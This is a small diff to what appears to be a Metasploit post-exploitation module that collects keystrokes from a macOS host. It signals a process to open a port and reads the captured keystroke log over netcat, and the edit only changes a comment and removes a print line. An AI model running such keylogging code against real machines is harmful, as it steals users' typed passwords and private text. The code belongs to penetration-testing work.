@@ -100,9 +100,8 @@ class MetasploitModule < Msf::Post
           print_status "Sending USR1 signal to open TCP port..."
           cmd_exec("kill -USR1 #{self.pid}")
           print_status "Dumping logs..."
-          # Telnet is not existent in High Sierra by default
+          # Telnet is not installed in MacOS 10.13+
           log = cmd_exec("nc localhost #{self.port}")
-          print_status log
           log_a = log.scan(/^\[.+?\] \[.+?\] .*$/)
           log = log_a.join("\n")+"\n"
           print_status "#{log_a.size} keystrokes captured"
